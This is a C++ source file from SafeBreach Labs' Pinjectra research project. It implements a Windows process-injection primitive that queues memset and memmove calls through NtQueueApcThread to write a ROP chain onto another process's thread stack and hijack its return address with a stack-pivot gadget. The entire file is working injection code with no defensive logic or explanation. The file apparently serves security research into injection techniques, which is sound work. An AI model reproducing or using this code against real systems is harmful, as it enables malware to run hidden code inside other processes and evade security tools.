// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

// Standard Include's
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>

// Local Include's
#include "NQAT_WITH_MEMSET.h"

NTSTATUS(NTAPI* NtQueueApcThread)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	//_In_ ULONG ApcReserved OPTIONAL
	_In_ __int64 ApcReserved OPTIONAL
	);

PINJECTRA_PACKET* NtQueueApcThread_WITH_memset::eval_and_write(TARGET_PROCESS* target, TStrDWORD64Map& params)
{
	HMODULE ntdll = GetModuleHandleA("ntdll");
	HANDLE t = target->thread;
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	payload_output = this->m_rop_chain_gen->eval(params);
	TStrDWORD64Map& tMetadata = *payload_output->metadata;

	DWORD64 orig_tos = tMetadata["orig_tos"];
	DWORD64 tos = tMetadata["tos"];
	DWORD64 rop_pos = tMetadata["rop_pos"];
	DWORD64* ROP_chain = (DWORD64*)payload_output->buffer;
	DWORD64 saved_return_address = tMetadata["saved_return_address"];
	DWORD64 GADGET_pivot = tMetadata["GADGET_pivot"];

	NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, __int64)) GetProcAddress(ntdll, "NtQueueApcThread");

	// Grow the stack to accommodate the new stack
	for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i), (void*)0, 1);
	}

	// Write the new stack
	for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*) * (((BYTE*)ROP_chain) + i), 1);
	}
	// Save the original return address into the new stack
	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(ROP_chain[saved_return_address]), (void*)orig_tos, 8);

	// overwrite the original return address with GADGET_pivot
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)& GADGET_pivot)[i]), 1);
	}
	// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)& tos)[i]), 1);
	}

	return payload_output;
}

NtQueueApcThread_WITH_memset::~NtQueueApcThread_WITH_memset() {

}
